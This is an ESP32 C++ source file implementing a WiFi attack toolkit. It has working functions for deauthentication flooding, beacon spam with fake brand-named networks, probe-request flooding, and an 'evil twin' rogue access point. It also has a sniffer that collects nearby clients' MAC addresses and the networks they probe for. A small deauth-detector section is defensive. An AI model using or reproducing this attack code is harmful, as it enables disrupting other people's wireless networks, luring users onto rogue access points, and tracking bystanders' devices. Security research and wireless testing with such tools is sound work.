#include "wifi_manager.h"

WiFiManager* WiFiManager::_instance = nullptr;

// ── 802.11 Frame Header ──────────────────────────────────────
// Minimal radiotap + 802.11 management frame layout
static const uint8_t kRadiotapHeader[] = {
  0x00, 0x00,             // revision, pad
  0x0c, 0x00,             // header length = 12
  0x04, 0x80, 0x00, 0x00, // present flags: rate + tx flags
  0x00,                   // rate: 1 Mbps
  0x00,                   // pad
  0x18, 0x00              // TX flags
};

// ── Lifecycle ────────────────────────────────────────────────

void WiFiManager::begin() {
  _instance = this;
  WiFi.mode(WIFI_MODE_NULL);
  esp_wifi_start();
}

void WiFiManager::stop() {
  stopPromiscuousSniffer();
  stopDeauthDetector();
  WiFi.mode(WIFI_MODE_NULL);
}

// ── Scanning ─────────────────────────────────────────────────

void WiFiManager::scanNetworks() {
  Serial.println("[WiFi] Scanning...");
  WiFi.mode(WIFI_STA);
  int n = WiFi.scanNetworks(false, true);
  networkCount = min((int)32, n);
  for (int i = 0; i < networkCount; i++) {
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 32);
    networks[i].ssid[32] = '\0';
    networks[i].rssi    = WiFi.RSSI(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].auth    = (wifi_auth_mode_t)WiFi.encryptionType(i);
  }
  WiFi.scanDelete();
  Serial.printf("[WiFi] Found %d networks.\n", networkCount);
}

void WiFiManager::printNetworks() {
  if (networkCount == 0) {
    Serial.println("  No networks. Run 'scan' first.");
    return;
  }
  Serial.println("  #   SSID                              BSSID              CH  RSSI  ENC");
  Serial.println("  --- --------------------------------  -----------------  --  ----  -------");
  for (int i = 0; i < networkCount; i++) {
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
      networks[i].bssid[0], networks[i].bssid[1], networks[i].bssid[2],
      networks[i].bssid[3], networks[i].bssid[4], networks[i].bssid[5]);
    Serial.printf("  %-3d %-32s  %-17s  %-2d  %-4d  %s\n",
      i, networks[i].ssid, bssidStr,
      networks[i].channel, networks[i].rssi,
      authModeName(networks[i].auth));
  }
}

// ── Promiscuous Sniffer ───────────────────────────────────────

void WiFiManager::_promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!_instance) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  int8_t   rssi    = pkt->rx_ctrl.rssi;
  uint8_t  ch      = pkt->rx_ctrl.channel;

  // 802.11 frame control
  uint8_t frameType    = payload[0] & 0x0C;
  uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;

  // Data frames → attempt client extraction (addr1=dst, addr2=src, addr3=bssid)
  if (frameType == 0x08 && pkt->rx_ctrl.sig_len > 24) {
    uint8_t* src   = payload + 10; // addr2
    uint8_t* bssid = payload + 16; // addr3
    // Skip multicast/broadcast source
    if (src[0] & 0x01) return;
    // Check not already recorded
    WiFiManager* m = _instance;
    for (int i = 0; i < m->clientCount; i++) {
      if (memcmp(m->clients[i].mac, src, 6) == 0) return;
    }
    if (m->clientCount < 64) {
      memcpy(m->clients[m->clientCount].mac, src, 6);
      memcpy(m->clients[m->clientCount].ap_bssid, bssid, 6);
      m->clients[m->clientCount].rssi = rssi;
      m->clientCount++;
      // Print immediately
      Serial.printf("  [CLIENT] %02X:%02X:%02X:%02X:%02X:%02X  AP: %02X:%02X:%02X:%02X:%02X:%02X  ch:%d  rssi:%d\n",
        src[0],src[1],src[2],src[3],src[4],src[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        ch, rssi);
    }
  }

  // Probe requests → log SSID being probed
  if (frameType == 0x00 && frameSubtype == 0x04 && pkt->rx_ctrl.sig_len > 24) {
    uint8_t* src = payload + 10;
    uint8_t* ie  = payload + 24;
    if (ie[0] == 0x00 && ie[1] > 0) { // SSID IE
      char ssid[33] = {0};
      memcpy(ssid, ie + 2, min((int)ie[1], 32));
      Serial.printf("  [PROBE]  %02X:%02X:%02X:%02X:%02X:%02X → \"%s\"  ch:%d  rssi:%d\n",
        src[0],src[1],src[2],src[3],src[4],src[5], ssid, ch, rssi);
    }
  }
}

void WiFiManager::startPromiscuousSniffer() {
  if (_sniffing) return;
  clientCount = 0;
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCallback);
  _sniffing = true;
  _channel  = 1;
  esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
  Serial.println("[WiFi] Sniffer started — hopping channels...");
}

void WiFiManager::stopPromiscuousSniffer() {
  if (!_sniffing) return;
  esp_wifi_set_promiscuous(false);
  _sniffing = false;
  Serial.println("[WiFi] Sniffer stopped.");
}

void WiFiManager::snifferTick() {
  if (!_sniffing) return;
  static uint32_t lastHop = 0;
  if (millis() - lastHop > CHANNEL_HOP_INTERVAL_MS) {
    _channel = (_channel % WIFI_SCAN_CHANNEL_MAX) + 1;
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    lastHop = millis();
  }
}

// ── Raw Frame Sending ────────────────────────────────────────

void WiFiManager::_sendRawFrame(const uint8_t* frame, size_t len) {
  esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
}

// ── Deauth Attack ────────────────────────────────────────────
//
//  Frame layout (24 bytes management header + 2 bytes reason):
//  FC[2] | Dur[2] | DA[6] | SA[6] | BSSID[6] | SeqCtrl[2] | Reason[2]

void WiFiManager::_buildDeauthFrame(uint8_t* buf, const uint8_t* dst,
                                     const uint8_t* src, const uint8_t* bssid,
                                     uint16_t reason) {
  buf[0] = 0xC0; // Frame Control: Deauth (type=0, subtype=12)
  buf[1] = 0x00;
  buf[2] = 0x00; buf[3] = 0x00; // Duration
  memcpy(buf + 4,  dst,   6);   // DA
  memcpy(buf + 10, src,   6);   // SA
  memcpy(buf + 16, bssid, 6);   // BSSID
  buf[22] = 0x00; buf[23] = 0x00; // Sequence Control
  buf[24] = reason & 0xFF;         // Reason Code (low byte)
  buf[25] = (reason >> 8) & 0xFF;
}

void WiFiManager::deauthAttack(uint8_t ap_bssid[6], uint8_t* target_mac, uint8_t channel, uint16_t rounds) {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true); // needed for raw TX
  setChannel(channel);

  uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t* target = target_mac ? target_mac : broadcast;

  uint8_t frame[26];
  uint16_t sent = 0;
  uint16_t limit = (rounds == 0) ? 0xFFFF : rounds * DEAUTH_BURST;

  Serial.printf("[DEAUTH] Targeting %02X:%02X:%02X:%02X:%02X:%02X on ch%d\n",
    target[0],target[1],target[2],target[3],target[4],target[5], channel);

  while (sent < limit) {
    // → AP: STA→AP deauth
    _buildDeauthFrame(frame, ap_bssid, target, ap_bssid, DEAUTH_REASON_CODE);
    _sendRawFrame(frame, 26);
    // → STA: AP→STA deauth
    _buildDeauthFrame(frame, target, ap_bssid, ap_bssid, DEAUTH_REASON_CODE);
    _sendRawFrame(frame, 26);
    sent += 2;
    // Allow serial interrupt check
    if (sent % 100 == 0) {
      Serial.printf("  Sent %d frames...\n", sent);
      if (Serial.available()) break;
    }
  }
  esp_wifi_set_promiscuous(false);
  Serial.printf("[DEAUTH] Done. %d frames sent.\n", sent);
}

// ── Beacon Spam ───────────────────────────────────────────────

void WiFiManager::_buildBeaconFrame(uint8_t* buf, size_t& len,
                                     const char* ssid, uint8_t channel,
                                     const uint8_t* bssid) {
  memset(buf, 0, 128);
  uint8_t ssidLen = strlen(ssid);

  // Frame Control: Beacon (subtype 8)
  buf[0] = 0x80; buf[1] = 0x00;
  // Duration, DA=broadcast, SA=bssid, BSSID, SeqCtrl
  buf[2] = 0x00; buf[3] = 0x00;
  memset(buf + 4,  0xFF, 6);    // DA: broadcast
  memcpy(buf + 10, bssid, 6);   // SA
  memcpy(buf + 16, bssid, 6);   // BSSID
  buf[22] = 0x00; buf[23] = 0x00;

  // Timestamp (8 bytes)
  uint64_t ts = (uint64_t)micros();
  memcpy(buf + 24, &ts, 8);

  // Beacon Interval: 100 TUs = 0x6400
  buf[32] = 0x64; buf[33] = 0x00;

  // Capability: ESS + Privacy (WPA illusion)
  buf[34] = 0x31; buf[35] = 0x04;

  uint8_t* ie = buf + 36;

  // SSID IE
  ie[0] = 0x00; ie[1] = ssidLen;
  memcpy(ie + 2, ssid, ssidLen);
  ie += 2 + ssidLen;

  // Supported rates IE
  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(ie, rates, sizeof(rates));
  ie += sizeof(rates);

  // DS Parameter Set IE (channel)
  ie[0] = 0x03; ie[1] = 0x01; ie[2] = channel;
  ie += 3;

  len = ie - buf;
}

void WiFiManager::beaconSpam(uint8_t channel, uint16_t count) {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  setChannel(channel);

  Serial.printf("[BEACON SPAM] Sending %d fake APs on ch%d...\n", count, channel);

  const char* prefixes[] = {"FREE_WIFI", "Starbucks", "xfinitywifi", "ATT", "Netgear",
                              "linksys", "ASUS_", "TP-Link", "Google_", "Hidden_"};
  uint8_t fakeBSSID[6];

  for (uint16_t i = 0; i < count; i++) {
    // Random BSSID (locally administered bit set)
    esp_fill_random(fakeBSSID, 6);
    fakeBSSID[0] = (fakeBSSID[0] | 0x02) & 0xFE;

    char ssid[33];
    snprintf(ssid, sizeof(ssid), "%s_%02X%02X",
             prefixes[i % 10], fakeBSSID[4], fakeBSSID[5]);

    uint8_t frame[128];
    size_t  frameLen = 0;
    _buildBeaconFrame(frame, frameLen, ssid, channel, fakeBSSID);

    for (int burst = 0; burst < 5; burst++) {
      _sendRawFrame(frame, frameLen);
      delay(2);
    }
    Serial.printf("  [%3d] %s\n", i + 1, ssid);
    if (Serial.available()) break;
  }

  esp_wifi_set_promiscuous(false);
  Serial.println("[BEACON SPAM] Done.");
}

// ── Probe Flood ───────────────────────────────────────────────

void WiFiManager::probeFlood(uint8_t channel, uint16_t count) {
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  setChannel(channel);

  uint8_t fakeSrc[6];
  esp_fill_random(fakeSrc, 6);
  fakeSrc[0] = (fakeSrc[0] | 0x02) & 0xFE;

  uint8_t frame[64];
  // Probe request FC
  frame[0] = 0x40; frame[1] = 0x00;
  frame[2] = 0x00; frame[3] = 0x00;
  memset(frame + 4,  0xFF, 6); // DA broadcast
  memcpy(frame + 10, fakeSrc, 6);
  memset(frame + 16, 0xFF, 6); // BSSID broadcast
  frame[22] = 0x00; frame[23] = 0x00;
  // Wildcard SSID (empty)
  frame[24] = 0x00; frame[25] = 0x00;
  // Supported rates
  uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(frame + 26, rates, sizeof(rates));

  Serial.printf("[PROBE FLOOD] %d probes on ch%d...\n", count, channel);
  for (uint16_t i = 0; i < count; i++) {
    esp_fill_random(fakeSrc, 6);
    fakeSrc[0] = (fakeSrc[0] | 0x02) & 0xFE;
    memcpy(frame + 10, fakeSrc, 6);
    _sendRawFrame(frame, 36);
    delay(5);
    if (Serial.available()) break;
  }
  esp_wifi_set_promiscuous(false);
  Serial.println("[PROBE FLOOD] Done.");
}

// ── Evil Twin AP ──────────────────────────────────────────────

bool WiFiManager::evilTwin(const char* ssid, const char* password, uint8_t channel) {
  WiFi.mode(WIFI_AP);
  bool ok;
  if (password && strlen(password) >= 8)
    ok = WiFi.softAP(ssid, password, channel);
  else
    ok = WiFi.softAP(ssid, nullptr, channel); // Open AP

  if (ok) {
    Serial.printf("[EVIL TWIN] AP \"%s\" up on ch%d  IP: %s\n",
      ssid, channel, WiFi.softAPIP().toString().c_str());
  } else {
    Serial.println("[EVIL TWIN] Failed to start AP.");
  }
  return ok;
}

void WiFiManager::stopEvilTwin() {
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_MODE_NULL);
  Serial.println("[EVIL TWIN] AP stopped.");
}

// ── Deauth Detector ───────────────────────────────────────────

void WiFiManager::_detectorCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!_instance || type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t subtype = (pkt->payload[0] & 0xF0) >> 4;

  bool isDeauth = (subtype == 0x0C); // Deauthentication
  bool isDisassoc = (subtype == 0x0A); // Disassociation

  if (isDeauth || isDisassoc) {
    uint32_t now = millis();
    _instance->_deauthCount++;

    if (now - _instance->_deauthWindow > DEAUTH_DETECT_WINDOW_MS) {
      _instance->_deauthWindow = now;
    }

    uint8_t* src   = pkt->payload + 10;
    uint8_t* bssid = pkt->payload + 16;
    uint16_t reason = *(uint16_t*)(pkt->payload + 24);

    Serial.printf("  [!] %s frame  src:%02X:%02X:%02X:%02X:%02X:%02X  "
                  "bssid:%02X:%02X:%02X:%02X:%02X:%02X  reason:0x%04X  rssi:%d\n",
      isDeauth ? "DEAUTH" : "DISASSOC",
      src[0],src[1],src[2],src[3],src[4],src[5],
      bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
      reason, pkt->rx_ctrl.rssi);

    if (_instance->_deauthCount >= DEAUTH_DETECT_THRESHOLD) {
      Serial.println("  [!!!] DEAUTH STORM DETECTED — POSSIBLE ATTACK IN PROGRESS");
    }
  }
}

void WiFiManager::startDeauthDetector() {
  if (_detecting) return;
  _deauthCount  = 0;
  _deauthWindow = millis();
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_detectorCallback);
  _detecting = true;
  Serial.println("[BLUE TEAM] Deauth detector started.");
}

void WiFiManager::stopDeauthDetector() {
  if (!_detecting) return;
  esp_wifi_set_promiscuous(false);
  _detecting = false;
  Serial.println("[BLUE TEAM] Detector stopped.");
}

// ── Helpers ───────────────────────────────────────────────────

void WiFiManager::setChannel(uint8_t ch) {
  _channel = ch;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void WiFiManager::printMAC(const uint8_t* mac) {
  Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

const char* WiFiManager::authModeName(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:          return "OPEN";
    case WIFI_AUTH_WEP:           return "WEP";
    case WIFI_AUTH_WPA_PSK:       return "WPA";
    case WIFI_AUTH_WPA2_PSK:      return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA/2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK:      return "WPA3";
    default:                      return "?";
  }
}

WiFiManager wifiMgr;
